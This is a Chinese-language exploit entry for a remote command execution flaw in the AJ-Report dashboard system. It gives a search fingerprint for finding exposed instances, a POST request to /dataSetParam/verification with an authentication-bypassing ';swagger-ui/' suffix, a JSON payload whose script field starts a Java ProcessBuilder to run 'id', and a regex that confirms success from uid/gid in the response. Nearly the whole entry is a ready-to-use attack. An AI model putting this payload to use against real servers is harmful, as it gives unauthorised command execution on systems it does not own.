# AJ-Report数据大屏系统verification远程命令执行

- **系统**：AJ-Report　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="AJ-Report"`
- **请求**：`POST /dataSetParam/verification;swagger-ui/ HTTP/1.1`
- **关键头**：`Content-Type: application/json;charset=UTF-8`

**请求体 / payload**
```
{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```
- **预期**：200　|　^(?=.*?uid)(?=.*?gid).*?$